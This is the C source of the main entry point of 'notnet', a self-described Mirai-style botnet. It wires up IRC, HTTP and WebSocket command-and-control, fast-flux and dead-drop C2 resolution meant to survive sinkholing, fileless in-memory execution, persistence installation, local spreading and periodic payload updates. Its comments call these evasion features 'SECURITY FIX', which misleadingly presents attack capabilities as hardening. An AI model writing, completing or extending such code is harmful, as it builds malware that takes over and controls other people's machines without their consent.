/*
 * notnet - Modern Mirai-Style Botnet
 * Main entry point
 *
 * Research purposes only. Default scan rate: 30s interval.
 */
#include "config.h"
#include "protocol.h"
#include "spread.h"
#include "payload.h"
#include "persist.h"
#include "deaddrop.h"
#include "util.h"
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <signal.h>
#include <time.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <errno.h>

/* ── Global State ───────────────────────────────────────────── */
notnet_bot_t g_bot;
static volatile int g_running = 1;

/* ── Signal Handlers ────────────────────────────────────────── */
static void signal_handler(int sig) {
    if (sig == SIGINT || sig == SIGTERM) {
        g_running = 0;
    }
}

/* Lock file descriptor (global so cleanup can close it) */
static int g_lock_fd = -1;

/* ── Initialization ─────────────────────────────────────────── */
static int init_bot(void) {
    /* Atomically create lock file with O_CREAT|O_EXCL to avoid TOCTOU.
     * O_EXCL fails with EEXIST if the file already exists (including symlinks).
     * This prevents symlink attacks in /tmp. */
    g_lock_fd = open("/tmp/notnet.lock", O_CREAT | O_EXCL | O_WRONLY, 0644);
    if (g_lock_fd < 0) {
        if (errno == EEXIST) {
            fprintf(stderr, "[notnet] Another instance running, exiting\n");
        } else {
            fprintf(stderr, "[notnet] Failed to create lock file: %s\n", strerror(errno));
        }
        return -1;
    }
    
    /* Write PID to lock file */
    char pid_str[16];
    int pid_len = snprintf(pid_str, sizeof(pid_str), "%d", getpid());
    if (write(g_lock_fd, pid_str, pid_len) != pid_len) {
        fprintf(stderr, "[notnet] Failed to write lock file\n");
        close(g_lock_fd);
        g_lock_fd = -1;
        unlink("/tmp/notnet.lock");
        return -1;
    }
    /* Keep fd open until cleanup to hold the lock */
    
    /* Initialize random seed */
    srand(time(NULL));
    
    /* Initialize bot state */
    memset(&g_bot, 0, sizeof(g_bot));
    
    /* Init timestamps */
    g_bot.last_update = time(NULL);
    g_bot.uptime = time(NULL);
    
    /* Self-identification */
    char hostname_buf[BOT_MAX_HOSTNAME_LEN];
    gethostname(hostname_buf, sizeof(hostname_buf));
    snprintf(g_bot.hostname, BOT_MAX_HOSTNAME_LEN, "%s", hostname_buf);
    g_bot.scan_interval = SCAN_SLEEP_SEC;
    /* SECURITY FIX (#84): Default to persistence ON. Set persist_enabled=0
     * (config file or NOTNET_PERSIST_ENABLED=0) for RAM-only fileless mode. */
    g_bot.persist_enabled = 1;
    
    /* SECURITY FIX (#85): Fast-flux C2 off by default — one hostname
     * resolution per connect, identical to prior behavior. Set
     * flux_enabled=1 to rotate through all A records of the C2
     * hostnames every flux_ttl seconds. */
    g_bot.flux_enabled = 0;
    g_bot.flux_ttl = FLUX_DEFAULT_TTL;
    
    /* SECURITY FIX (#86): Dead-drop C2 off by default. Set dead_drop_url=
     * to a pastebin-style HTTP URL hosting the verified endpoint blob; the
     * blob must echo c2_secret or it is ignored (static config falls back). */
    g_bot.dead_drop_url[0] = '\0';
    g_bot.dead_drop_interval = DEAD_DROP_DEFAULT_INTERVAL;
    
    /* Set default C2 config */
    strncpy(g_bot.c2_irc.server, IRC_DEFAULT_SERVER, sizeof(g_bot.c2_irc.server) - 1);
    g_bot.c2_irc.port = IRC_DEFAULT_PORT;
    strncpy(g_bot.c2_irc.channel, IRC_DEFAULT_CHANNEL, sizeof(g_bot.c2_irc.channel) - 1);
    
    strncpy(g_bot.c2_http.server, HTTP_DEFAULT_SERVER, sizeof(g_bot.c2_http.server) - 1);
    g_bot.c2_http.port = HTTP_DEFAULT_PORT;
    strncpy(g_bot.c2_http.path, HTTP_DEFAULT_PATH, sizeof(g_bot.c2_http.path) - 1);
    strncpy(g_bot.c2_http.user_agent, HTTP_USER_AGENT, sizeof(g_bot.c2_http.user_agent) - 1);
    
    strncpy(g_bot.c2_ws.server, WS_DEFAULT_SERVER, sizeof(g_bot.c2_ws.server) - 1);
    g_bot.c2_ws.port = WS_DEFAULT_PORT;
    strncpy(g_bot.c2_ws.path, WS_DEFAULT_PATH, sizeof(g_bot.c2_ws.path) - 1);
    
    /* Load config file if exists */
    load_config(&g_bot, "/etc/notnet.conf");

    /* SECURITY FIX (#2): Environment variable fallback for IRC password
     * if not set in config. */
    if (g_bot.c2_irc.pass[0] == '\0') {
        const char *env_pass = getenv("NOTNET_IRC_PASS");
        if (env_pass) {
            strncpy(g_bot.c2_irc.pass, env_pass, sizeof(g_bot.c2_irc.pass) - 1);
        }
    }

    /* SECURITY FIX (#35): Environment variable fallback for the shared
     * HTTP/WS command secret if not set in config. */
    if (g_bot.secret[0] == '\0') {
        const char *env_secret = getenv("NOTNET_C2_SECRET");
        if (env_secret) {
            strncpy(g_bot.secret, env_secret, sizeof(g_bot.secret) - 1);
            g_bot.secret[sizeof(g_bot.secret) - 1] = '\0';
        }
    }

    /* SECURITY FIX (#81): Environment variable fallback for the payload
     * SHA-256 pin if not set in config. */
    if (g_bot.payload_sha256[0] == '\0') {
        const char *env_hash = getenv("NOTNET_PAYLOAD_SHA256");
        if (env_hash && strlen(env_hash) == 64) {
            strncpy(g_bot.payload_sha256, env_hash, 64);
            g_bot.payload_sha256[64] = '\0';
        }
    }

    /* SECURITY FIX (#76): Environment variable fallback for the TLS cert
     * pin if not set in config. */
    if (g_bot.tls_cert_pin_sha256[0] == '\0') {
        const char *env_pin = getenv("NOTNET_TLS_CERT_PIN_SHA256");
        if (env_pin && strlen(env_pin) == 64) {
            strncpy(g_bot.tls_cert_pin_sha256, env_pin, 64);
            g_bot.tls_cert_pin_sha256[64] = '\0';
        }
    }

    /* SECURITY FIX (#84): Environment variable fallback for RAM-only
     * fileless mode. 0 = no persistence install, self-relaunch from an
     * anonymous memfd on Linux. Unlike the string keys above, a set env
     * var takes precedence over the config value — 0 is meaningful, so
     * "unset" and "set to 0" cannot share a sentinel. */
    const char *env_persist = getenv("NOTNET_PERSIST_ENABLED");
    if (env_persist) {
        g_bot.persist_enabled = (atoi(env_persist) != 0);
    }

    /* SECURITY FIX (#69): Environment variable fallbacks for the on-target
     * compilation source bundle. */
    if (g_bot.payload_source_sha256[0] == '\0') {
        const char *env_src = getenv("NOTNET_PAYLOAD_SOURCE_SHA256");
        if (env_src && strlen(env_src) == 64) {
            strncpy(g_bot.payload_source_sha256, env_src, 64);
            g_bot.payload_source_sha256[64] = '\0';
        }
    }
    if (g_bot.payload_source_url[0] == '\0') {
        const char *env_url = getenv("NOTNET_PAYLOAD_SOURCE_URL");
        if (env_url) {
            strncpy(g_bot.payload_source_url, env_url, sizeof(g_bot.payload_source_url) - 1);
            g_bot.payload_source_url[sizeof(g_bot.payload_source_url) - 1] = '\0';
        }
    }

    /* SECURITY FIX (#5): Environment variable fallback for auth nicks */
    if (g_bot.c2_irc.auth_nick_count == 0) {
        const char *env_nicks = getenv("NOTNET_IRC_AUTH_NICKS");
        if (env_nicks) {
            char nicks_copy[512];
            strncpy(nicks_copy, env_nicks, sizeof(nicks_copy) - 1);
            nicks_copy[sizeof(nicks_copy) - 1] = '\0';
            char *saveptr = NULL;
            char *tok = strtok_r(nicks_copy, ",", &saveptr);
            while (tok && g_bot.c2_irc.auth_nick_count < 8) {
                while (*tok == ' ' || *tok == '\t') tok++;
                char *end = tok + strlen(tok) - 1;
                while (end > tok && (*end == ' ' || *end == '\t')) *end-- = '\0';
                if (*tok) {
                    strncpy(g_bot.c2_irc.auth_nicks[g_bot.c2_irc.auth_nick_count],
                            tok, 31);
                    g_bot.c2_irc.auth_nicks[g_bot.c2_irc.auth_nick_count][31] = '\0';
                    g_bot.c2_irc.auth_nick_count++;
                }
                tok = strtok_r(NULL, ",", &saveptr);
            }
        }
    }

    /* Defaults for scan limits (overridden by config) */
    if (g_bot.scan_timeout_ms == 0) g_bot.scan_timeout_ms = SCAN_TIMEOUT_MS;
    if (g_bot.scan_max_hosts == 0) g_bot.scan_max_hosts = 254;
    if (g_bot.heartbeat_interval == 0) g_bot.heartbeat_interval = HEARTBEAT_INTERVAL;
    
    log_init();
    log_info("notnet v%s starting", NOTNET_VERSION);
    
    return 0;
}

/* ── Cleanup ────────────────────────────────────────────────── */
static void cleanup_bot(void) {
    log_info("notnet shutting down");
    
    /* Close and remove lock file */
    if (g_lock_fd >= 0) {
        close(g_lock_fd);
        g_lock_fd = -1;
    }
    unlink("/tmp/notnet.lock");

    /* Release the shared OpenSSL context (no-op when TLS not compiled in) */
    tls_cleanup();
    
    /* Flush logs */
    log_flush();
    log_close();
}

/* ── Main Loop ──────────────────────────────────────────────── */
int main(void) {
    signal(SIGINT, signal_handler);
    signal(SIGTERM, signal_handler);
    
    if (init_bot() != 0) {
        return EXIT_FAILURE;
    }
    
    /* SECURITY FIX (#84): RAM-only fileless mode first — this may replace
     * the process image from an anonymous memfd (fexecve). Then install
     * persistence unless persist_enabled=0. */
    persist_become_fileless(&g_bot);
    persist_install(&g_bot);
    
    /* SECURITY FIX (#86): Dead-drop C2 resolution runs at boot before any
     * channel connects. A verified blob overrides the static endpoints; a
     * failed, malformed, or unverified fetch leaves them as the fallback. */
    deaddrop_resolve(&g_bot);
    
    log_info("C2 protocols: IRC=%d HTTP=%d WS=%d",
             g_bot.c2_enabled & C2_IRC,
             g_bot.c2_enabled & C2_HTTP,
             g_bot.c2_enabled & C2_WS);
    
    /* Heartbeat timer */
    time_t last_heartbeat = time(NULL);
    /* Dead-drop re-resolution timer (#86) */
    time_t last_dead_drop = time(NULL);
    
    while (g_running) {
        /* Try to connect to C2 */
        protocol_connect_all(&g_bot);
        
        /* Process C2 commands */
        protocol_process_commands(&g_bot);
        
        /* Spread if not connected to primary C2 */
        if (!(g_bot.c2_enabled & (C2_IRC | C2_HTTP))) {
            log_info("Primary C2 unavailable, spreading locally");
            spread_local(&g_bot);
        }
        
        /* Periodic heartbeat (on HEARTBEAT_INTERVAL timer, not every loop) */
        uint32_t hb_interval = (g_bot.heartbeat_interval > 0) ? g_bot.heartbeat_interval : HEARTBEAT_INTERVAL;
        if (time(NULL) - last_heartbeat >= hb_interval) {
            protocol_send_heartbeat(&g_bot);
            last_heartbeat = time(NULL);
        }

        /* SECURITY FIX (#86): Periodic dead-drop re-resolution. A repointed
         * drop (e.g. the old C2 was sinkholed) takes effect on the next
         * connect attempt. Disabled when no dead_drop_url is configured. */
        if (g_bot.dead_drop_url[0] != '\0') {
            uint32_t dd_interval = (g_bot.dead_drop_interval > 0)
                                   ? g_bot.dead_drop_interval
                                   : DEAD_DROP_DEFAULT_INTERVAL;
            if (time(NULL) - last_dead_drop >= (time_t)dd_interval) {
                deaddrop_resolve(&g_bot);
                last_dead_drop = time(NULL);
            }
        }

        /* SECURITY FIX (#65): Periodic update check (every 6h by its own
         * internal timer). Previously payload_check_update() was dead code
         * — CMD_UPDATE was the only update path and it was a stub. */
        payload_check_update(&g_bot);
        
        /* Sleep until next scan cycle */
        usleep(g_bot.scan_interval * 1000000);
    }
    
    cleanup_bot();
    return EXIT_SUCCESS;
}
